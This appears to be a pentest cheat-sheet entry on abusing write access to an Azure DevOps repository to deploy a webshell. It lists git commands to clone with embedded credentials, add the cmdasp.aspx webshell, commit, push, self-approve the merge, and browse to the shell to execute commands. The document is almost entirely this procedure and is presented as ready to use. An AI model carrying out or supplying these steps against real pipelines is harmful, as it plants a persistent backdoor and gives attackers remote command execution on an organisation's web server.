## Azure DevOps CI/CD command injection

### Requirements: Authenticated access to Azure DevOps tenant, and privileges to write into the CI/CD pipeline.

### Steps:

#### 1) Go to: The project the user has access in -> Pipelines -> Builds -> View

#### 2) Clone the repository we have access to

    git clone http://USER:PASSWORD@DOMAIN.COM/path/to/repository 

#### 3) Create a new branch in the repository directory

    git checkout -b shell

#### 4) Copy a webshell into our current directory

    cp /usr/share/webshells/aspx/cmdasp.aspx . 

#### 5) 

    git add .

#### 6) Upload the file to the webserver

    git commit -m 'pwn3d!' 

#### 7) Push the commit to the Azure DevOps repository

    git push -u origin shell 

#### 8) Create a pull request to merge this branch into the master branch

#### 9) Set a title, a work item, and then create

#### 10) Approve -> Complete

#### 11) Browse to http://DOMAIN.COM/cmdasp.aspx to execute commands!
